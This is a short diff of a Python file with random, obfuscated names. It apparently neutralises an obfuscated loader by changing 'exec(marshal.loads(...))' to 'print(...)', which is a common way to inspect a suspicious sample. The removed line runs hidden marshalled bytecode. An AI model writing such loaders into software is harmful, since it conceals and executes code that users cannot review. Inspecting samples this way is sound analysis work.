@@ -18,4 +18,4 @@ def jrAfdJmT():
 
 jrAfdJmT()
 
-exec(marshal.loads(aUWOGikV))
+print(marshal.loads(aUWOGikV))
